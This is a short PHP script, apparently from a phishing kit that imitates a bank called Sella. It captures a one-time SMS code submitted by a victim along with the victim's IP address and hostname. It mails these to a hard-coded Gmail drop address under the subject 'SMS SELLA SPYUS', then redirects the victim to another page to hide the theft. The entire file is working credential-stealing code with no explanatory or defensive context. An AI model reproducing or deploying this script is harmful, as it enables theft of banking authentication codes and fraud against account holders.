<?php

$ZIK30=$_POST['ZIK3'];


$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['ZIK30'] = $ZIK30;    
       


$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$message .= "~~~~~~~~~~~~\n";
$message .= "SMSINOU : ".$_SESSION['ZIK30']."\n";

$message .= "~~~~~~~~~~~~~~~~~~~~\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";

$email = "nsakolchi@gmail.com";
$subject = "SMS SELLA SPYUS $ip";
$back = "redV.html";
mail($email, $subject, $message);

header("location: ".$back);
?>